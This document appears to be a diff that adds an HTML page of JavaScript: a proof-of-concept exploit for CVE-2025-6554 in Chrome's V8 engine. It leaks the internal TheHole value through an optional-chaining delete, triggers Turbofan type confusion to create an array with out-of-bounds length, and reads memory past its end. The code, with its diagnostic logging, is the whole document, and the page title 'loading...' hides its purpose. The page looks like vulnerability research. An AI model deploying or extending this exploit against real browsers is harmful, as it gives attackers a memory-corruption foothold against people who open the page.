@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>loading...</title></head>
+<body>
+<pre id="out">CVE-2025-6554 TheHole Leak Test</pre>
+<script>
+const log = (msg) => {
+  document.getElementById('out').textContent += '\n' + msg;
+  document.title = msg;
+};
+
+try {
+  log("start");
+
+  // === Step 1: TheHole Leak ===
+  // Optional chaining delete bypasses TDZ hole-check
+  // VisitDelete's OptionalChainNullLabelScope lacks HoleCheckElisionScope
+  // So ThrowReferenceErrorIfHole is elided for y
+  function leak_hole() {
+    let x;
+    delete x?.[y]?.a;
+    return y;
+    let y;
+  }
+
+  let hole;
+  try {
+    hole = leak_hole();
+  } catch(e) {
+    log("BLOCKED: " + e.message);
+    throw e;
+  }
+
+  // Detect TheHole
+  // TheHole is a V8 internal Oddball where:
+  //   typeof === "undefined" BUT !== undefined
+  let isHole = (typeof hole === "undefined" && hole !== undefined);
+
+  log("HOLE_TEST: typeof=" + typeof hole +
+      " ===undef=" + (hole === undefined) +
+      " ==undef=" + (hole == undefined) +
+      " ===null=" + (hole === null) +
+      " isHole=" + isHole);
+
+  if (!isHole) {
+    log("FAIL: TheHole did not leak. Bug may be patched.");
+    // Additional diagnostics
+    log("value=" + String(hole));
+    log("json=" + JSON.stringify(hole));
+  } else {
+    log("SUCCESS: TheHole leaked!");
+
+    // === Step 2: Verify TheHole properties ===
+    try {
+      // TheHole.length should return -524289 (0xFFF7FFFF)
+      let holeLen = hole.length;
+      log("hole.length=" + holeLen);
+
+      // Math.sign test
+      let sign = Math.sign(holeLen);
+      log("Math.sign(hole.length)=" + sign);
+    } catch(e) {
+      log("hole.length error: " + e.message);
+    }
+
+    // === Step 3: Map.delete with hole ===
+    try {
+      let map = new Map();
+      map.set("test", 1);
+      map.delete(hole);  // Should work without error if hole is TheHole
+      log("Map.delete(hole): OK");
+    } catch(e) {
+      log("Map.delete error: " + e.message);
+    }
+
+    // === Step 4: Basic type confusion test ===
+    try {
+      let o = {};
+      o.maybe_hole = hole;
+      let len = o.maybe_hole.length;
+      let sign = Math.sign(len);
+      log("type_confusion: len=" + len + " sign=" + sign);
+    } catch(e) {
+      log("type_confusion error: " + e.message);
+    }
+
+    // === Step 5: Test Turbofan exploitation path ===
+    // This needs many iterations to trigger Turbofan
+    function hax(trigger) {
+      let x;
+      delete x?.[y]?.a;
+      let h = y;
+      let y;
+
+      let o = {};
+      o.maybe_hole = trigger ? h : "not the hole";
+      let len = o.maybe_hole.length;
+      let sign = Math.sign(len);
+      let i1 = 2 - (sign + 1);
+      let i2 = 5 - (i1 + 4) >> 1;
+      let i3 = 1 * i2 + 1;
+      let i4 = i3 * 100;
+
+      let arr = new Array(8);
+      arr[0] = 13.37;
+      arr[i4] = 13.37;
+      return arr;
+    }
+
+    // Warm up Turbofan (0x10000 = 65536 iterations)
+    log("Warming up Turbofan...");
+    for (let i = 0; i < 0x10000; i++) {
+      hax(false);
+    }
+    log("Turbofan warmup done");
+
+    // Trigger with TheHole
+    let corrupted = hax(true);
+    log("corrupted.length=" + corrupted.length + " (expect 101 if OOB)");
+
+    if (corrupted.length > 8) {
+      log("OOB ARRAY CREATED! length=" + corrupted.length);
+
+      // Read beyond bounds
+      let oob_reads = [];
+      for (let i = 8; i < Math.min(corrupted.length, 20); i++) {
+        oob_reads.push(i + ":" + corrupted[i]);
+      }
+      log("OOB reads: " + oob_reads.join(", "));
+    } else {
+      log("No OOB: array length is " + corrupted.length);
+    }
+  }
+} catch(e) {
+  log("ERROR: " + e.message + " | " + e.stack);
+}
+
+log("=== done ===");
+</script>
+</body>
+</html>
